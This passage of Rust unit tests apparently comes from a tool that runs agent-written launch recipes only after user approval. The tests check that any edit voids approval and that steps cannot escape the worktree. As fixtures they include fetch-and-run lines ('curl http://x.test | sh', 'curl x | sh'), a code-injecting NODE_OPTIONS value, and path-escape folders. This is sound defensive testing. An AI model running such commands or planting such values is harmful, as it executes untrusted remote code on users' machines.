            prepare: vec![RecipeStep {
                command: "npm install".into(),
                dir: String::new(),
            }],
            processes: vec![RecipeProcess {
                name: "web".into(),
                command: "npm run dev".into(),
                env: [("PORT".to_string(), "4101".to_string())].into(),
                url: "http://localhost:4101".into(),
                ..Default::default()
            }],
            open: "http://localhost:4101/connexion".into(),
        };
        let root = wt.to_string_lossy().to_string();
        let mut meta = AgentMeta {
            cwd: root,
            recipe: Some(recipe.clone()),
            ..Default::default()
        };
        let refused = |meta: &AgentMeta, what: &str| {
            for (kind, index) in [("prep", 0), ("run", 0)] {
                let e = run_spec(meta, kind, index).unwrap_err().to_string();
                assert_eq!(e, not_approved(crate::i18n::Lang::Fr), "{what}: {kind}");
            }
        };
        // Written by the agent and never read by the user: nothing of it runs.
        refused(&meta, "never approved");
        // Another recipe approved is not this one.
        meta.approved_recipe = Some(TestRecipe::default());
        refused(&meta, "another recipe approved");
        meta.approved_recipe = Some(recipe.clone());
        assert!(run_spec(&meta, "prep", 0).is_ok() && run_spec(&meta, "run", 0).is_ok());

        // Changed in anything the user was shown, it is a new recipe to read.
        type Edit = fn(&mut TestRecipe);
        let edits: [(&str, Edit); 7] = [
            ("a command", |r| {
                r.processes[0].command.push_str(" --host 0.0.0.0")
            }),
            ("a variable", |r| {
                r.processes[0]
                    .env
                    .insert("NODE_OPTIONS".into(), "--require ./x.js".into());
            }),
            ("a variable's value", |r| {
                r.processes[0].env.insert("PORT".into(), "4102".into());
            }),
            ("a folder", |r| r.prepare[0].dir = "web".into()),
            ("a name", |r| r.processes[0].name = "api".into()),
            ("the address to open", |r| {
                r.open = "http://elsewhere.test".into()
            }),
            ("a step added", |r| {
                r.prepare.push(RecipeStep {
                    command: "curl http://x.test | sh".into(),
                    dir: String::new(),
                })
            }),
        ];
        for (what, edit) in edits {
            let mut changed = recipe.clone();
            edit(&mut changed);
            assert_ne!(changed, recipe, "{what}");
            meta.recipe = Some(changed);
            refused(&meta, what);
        }
        // Back to what was approved: it runs again, with no new question.
        meta.recipe = Some(recipe);
        assert!(run_spec(&meta, "prep", 0).is_ok() && run_spec(&meta, "run", 0).is_ok());
    }

    #[test]
    fn isola_starts_only_the_configuration_the_user_approved() {
        let mut meta = AgentMeta::default();
        let config = "[services.web]\ncommand = \"npm run dev\"\n";
        let refused = |meta: &AgentMeta, config: &str| {
            let e = check_isola_approved(meta, config).unwrap_err();
            assert_eq!(e.to_string(), isola_not_approved(crate::i18n::Lang::Fr));
        };
        refused(&meta, config);
        meta.approved_isola = Some(IsolaApproval {
            config: config.into(),
            open: String::new(),
        });
        assert!(check_isola_approved(&meta, config).is_ok());
        // Any other content, a line more or a character, even a line ending, is another file.
        refused(&meta, &format!("{config}setup = \"curl x | sh\"\n"));
        refused(&meta, &config.replace('\n', "\r\n"));
        refused(&meta, "");
    }

    #[test]
    fn a_recipe_step_runs_in_its_folder_with_the_ports_and_its_variables() {
        let wt = test_dir("launch-spec");
        std::fs::create_dir_all(wt.join("web")).unwrap();
        let recipe = TestRecipe {
            prepare: vec![RecipeStep {
                command: "npm install".into(),
                dir: "web".into(),
            }],
            processes: vec![
                RecipeProcess {
                    name: "web".into(),
                    command: "npm run dev".into(),
                    env: [("PORT".to_string(), "4101".to_string())].into(),
                    url: "http://localhost:4101".into(),
                    ..Default::default()
                },
                RecipeProcess {
                    name: "x".into(),
                    command: "y".into(),
                    dir: "web/absent".into(),
                    ..Default::default()
                },
            ],
            open: String::new(),
        };
        let root = wt.to_string_lossy().to_string();
        let meta = AgentMeta {
            cwd: root.clone(),
            worktree: Some(Worktree {
                path: root.clone(),
                branch: "ticket/x".into(),
                base_branch: "main".into(),
                existing: false,
            }),
            port_base: Some(4100),
            recipe: Some(recipe.clone()),
            approved_recipe: Some(recipe),
            ..Default::default()
        };
        let prep = run_spec(&meta, "prep", 0).unwrap();
        assert_eq!(
            Path::new(&prep.cwd).canonicalize().unwrap(),
            wt.join("web").canonicalize().unwrap()
        );
        assert_eq!(
            (prep.name.as_str(), prep.command.as_str()),
            ("Préparation 1", "npm install")
        );
        let run = run_spec(&meta, "run", 0).unwrap();
        assert_eq!(run.cwd, root);
        assert_eq!(
            run.env,
            vec![
                ("ESCOUADE_PORT_BASE".to_string(), "4100".to_string()),
                ("ESCOUADE_PORT_END".to_string(), "4109".to_string()),
                ("PORT".to_string(), "4101".to_string()),
            ]
        );
        // A folder that does not exist in the worktree.
        assert!(run_spec(&meta, "run", 1).is_err());
        assert!(run_spec(&meta, "run", 5).is_err());
        assert!(run_spec(&AgentMeta::default(), "run", 0).is_err());
        // Only "prep" and "run" are steps.
        assert!(run_spec(&meta, "autre", 0).is_err());
        assert!(run_spec(&meta, "", 0).is_err());
    }

    #[test]
    fn a_recipe_step_cannot_leave_the_worktree() {
        let wt = test_dir("launch-escape");
        let outside = test_dir("launch-escape-out");
        std::fs::create_dir_all(wt.join("web")).unwrap();
        // Folders that exist, so that only the containment check can refuse them.
        let sibling = format!("../{}", outside.file_name().unwrap().to_string_lossy());
        let mut dirs = vec![
            "..".to_string(),
            "web/../..".to_string(),
            sibling,
            outside.to_string_lossy().into_owned(),
        ];
        if crate::paths::make_dir_link(&outside, &wt.join("linked")) {
            dirs.push("linked".into());
        } else {
            eprintln!("Could not create link/junction (skipping the link case)");
        }
        let root = wt.to_string_lossy().to_string();
        // Approved, so that only the containment check can refuse them.
        let recipe = TestRecipe {
            prepare: dirs
                .iter()
                .map(|dir| RecipeStep {
                    command: "x".into(),
                    dir: dir.clone(),
                })
                .collect(),
            ..Default::default()
        };
        let meta = AgentMeta {
            cwd: root.clone(),
            recipe: Some(recipe.clone()),
            approved_recipe: Some(recipe),
            ..Default::default()
        };
        for (i, dir) in dirs.iter().enumerate() {
            assert!(
                run_spec(&meta, "prep", i).is_err(),
                "« {dir} » leaves the worktree"
            );
        }
    }
}
